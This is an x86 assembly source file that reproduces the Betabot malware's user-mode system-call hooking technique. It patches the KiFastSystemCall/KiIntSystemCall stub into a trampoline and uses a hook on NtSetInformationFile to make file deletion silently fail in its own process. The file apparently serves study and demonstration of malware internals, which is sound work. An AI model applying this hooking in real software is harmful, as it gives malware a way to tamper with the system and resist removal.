; Writing our trampoline at KiIntSystemCall as http://www.malwaretech.com/2014/06/usermode-system-call-hooking-betabot.html proposed.

.386
.model flat,stdcall
option casemap:none

include kernel32.inc
includelib kernel32.lib

.data

oldProtection dd ? 

fileToDelete db "C:\Temp\deleteMe.txt", 0 ; Create this file or change the path and check if it was deleted.

; Array listing all the hooks we install.
; Each hook is placed according to its function's syscall number.
arrayOfEvil DWORD 149h DUP (0), offset newNtSetInformationFile , 40h DUP (0)


.code

start:
	mov esi, 7FFE0300h
	lodsd 							; EAX = KiFastSystemCall
	call changeProtection			; Not changing the protection back is bad for your health
	mov edx, 0EEBFCh				; 0xFC = CLD, 0xEB0F JMP SHORT 0xE bytes
	mov [eax], edx
	lea eax, [eax + 10h]			; EAX = KiIntSystemCall
	mov dl, 0FDh					; 0xFD = STD
	mov [eax], dl

	inc eax
	
	mov dl, 0E9h					; [KiIntSystemCall + 1] = JMP
	mov [eax], dl
	
	mov edx, offset evilCode
	sub edx, eax
	sub edx, 5						; EBX = evilCode delta
	
	lea eax, [eax + 1]
	mov [eax], edx
	
	xor esi, esi
	
	push offset fileToDelete
	call DeleteFile
	
	push 8
	call ExitProcess

	xor esi, esi
	retn
	
	
	changeProtection:
		push eax					; Save KiFastSYstemCall addr
		push offset oldProtection
		push 40h					; PAGE_EXECUTE_READWRITE
		push 16h					; [KiIntSystemCall - KiFastSystemCall]
		push eax
		call VirtualProtect
		pop eax
		retn

	evilCode:
		pushfd
		pop edx
		bt edx, 0Ah 				; CF = DF
		jc origKiIntSystemCall
		mov ecx, offset arrayOfEvil
		lea ecx, [ecx + eax * 4]
		mov edx, [ecx]
		cmp edx, 0
		jz origKiFastSystemCall
		jmp edx
	
	newNtSetInformationFile:
		pushad
		mov edi, [esp + 38h]
		cmp edi, 0Dh				; 0xD = FileDispositionInformation
		jnz callRealKiFastSystemCall
		xor edi, edi
		mov ebx, [esp + 30h]		; EBX = (VOID *)dispositionInfo
		mov [ebx], dl				; dispositionInfo.DeleteFile = 0 (FALSE)
	callRealKiFastSystemCall:
		popad	
		jmp origKiFastSystemCall
		
	origKiFastSystemCall:
		mov edx, esp
		dw 340fh 					; SYSENTER
		retn
		
	origKiIntSystemCall:
		lea eax, [esp + 8]
		int 2Eh
		retn
	
end start